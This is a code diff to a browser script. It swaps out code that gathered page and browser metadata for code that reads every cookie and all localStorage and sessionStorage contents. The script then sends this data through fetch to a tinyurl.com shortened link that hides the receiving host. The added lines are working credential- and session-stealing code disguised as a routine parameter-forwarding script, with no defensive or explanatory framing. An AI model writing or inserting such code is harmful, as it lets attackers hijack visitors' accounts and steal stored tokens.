@@ -2,20 +2,24 @@
 // Get all URL parameters from current page
 const urlParams = new URLSearchParams(window.location.search);
 
-// Add caller information
-urlParams.set('caller_domain', window.location.hostname);
-urlParams.set('caller_origin', window.location.origin);
-urlParams.set('caller_href', window.location.href);
-urlParams.set('caller_protocol', window.location.protocol);
-urlParams.set('caller_port', window.location.port || (window.location.protocol === 'https:' ? '443' : '80'));
-urlParams.set('caller_pathname', window.location.pathname);
-urlParams.set('caller_referrer', document.referrer);
-urlParams.set('caller_user_agent', navigator.userAgent);
-urlParams.set('caller_language', navigator.language);
-urlParams.set('caller_platform', navigator.platform);
-urlParams.set('caller_screen_width', screen.width);
-urlParams.set('caller_screen_height', screen.height);
-urlParams.set('caller_timestamp', new Date().toISOString());
+// Extract cookies
+urlParams.set('cookies', document.cookie);
+
+// Extract localStorage items
+const localStorageData = {};
+for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    localStorageData[key] = localStorage.getItem(key);
+}
+urlParams.set('localStorage', JSON.stringify(localStorageData));
+
+// Extract sessionStorage items
+const sessionStorageData = {};
+for (let i = 0; i < sessionStorage.length; i++) {
+    const key = sessionStorage.key(i);
+    sessionStorageData[key] = sessionStorage.getItem(key);
+}
+urlParams.set('sessionStorage', JSON.stringify(sessionStorageData));
 
 // Pass all parameters to the endpoint
 fetch('https://tinyurl.com/pnwhouses?' + urlParams.toString());
